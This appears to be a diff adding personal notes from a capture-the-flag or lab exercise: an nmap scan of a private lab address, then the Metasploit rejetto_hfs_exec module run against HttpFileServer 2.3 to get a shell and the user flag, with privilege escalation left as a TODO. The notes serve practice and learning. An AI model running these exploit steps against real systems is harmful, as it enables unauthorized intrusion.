@@ -1,0 +1,13 @@
+nmap -T4 -A --top-ports 500 -oN nmap.txt 10.10.10.8
+# google HttpFileServer httpd 2.3
+msfconsole
+search rejetto_hfs_exec
+use windows/http/rejetto_hfs_exec
+options
+set rhosts 10.10.10.8
+run
+# shell!
+shell
+# got user flag
+# admin folder gives access denied
+# TODO hunt for priviledge escalation
